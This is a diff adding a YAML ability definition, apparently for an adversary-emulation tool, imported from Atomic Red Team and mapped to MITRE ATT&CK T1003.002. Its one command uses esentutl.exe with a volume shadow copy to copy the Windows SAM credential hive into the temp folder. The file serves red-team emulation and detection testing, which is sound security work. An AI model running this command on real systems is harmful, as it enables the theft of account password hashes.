@@ -1,0 +1,42 @@
+- id: a90c2f4d-6726-444e-99d2-a00cd7c20480
+  name: esentutl.exe SAM copy
+  description: 'Copy the SAM hive using the esentutl.exe utility
+
+    This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      sh:
+        command: esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
+        cleanup: 'del #{copy_dest}\#{file_name} >nul 2>&1'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1003.002
+  - credential-access
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_path:
+        description: Path to the file to copy
+        type: path
+        default: '%SystemRoot%/system32/config/SAM'
+      file_name:
+        description: Name of the copied file
+        type: string
+        default: SAM
+      copy_dest:
+        description: Destination of the copied file
+        type: string
+        default: '%temp%'
+    technique_created: '2020-02-11T18:42:07.281Z'
+    atomic_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
+    import_timestamp: '2025-06-24T11:15:06.142828Z'
